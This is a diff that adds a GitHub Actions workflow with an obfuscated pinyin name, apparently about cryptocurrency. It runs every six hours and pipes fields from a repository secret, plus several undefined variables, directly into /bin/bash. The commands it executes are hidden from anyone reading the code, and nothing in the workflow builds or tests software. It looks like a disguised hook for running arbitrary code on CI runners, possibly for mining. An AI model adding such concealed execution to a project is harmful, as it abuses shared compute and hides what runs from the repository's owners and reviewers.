@@ -1,0 +1,22 @@
+name: jiamihuobiheguiwan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiamihuobiheguiwan
+        env:
+          x692: ${{ secrets.x692 }}
+        run: |
+          echo $x692 | jq -r .rgymi2939 | /bin/bash
+          echo $ah368 | jq -r .g30 | /bin/bash
+          echo $a40 | jq -r .h30521 | /bin/bash
+          echo $rskl45949 | jq -r .xhr67485 | /bin/bash
+          echo $kkd19 | jq -r .puyh3047 | /bin/bash
+          echo $h854 | jq -r .jk609 | /bin/bash
+
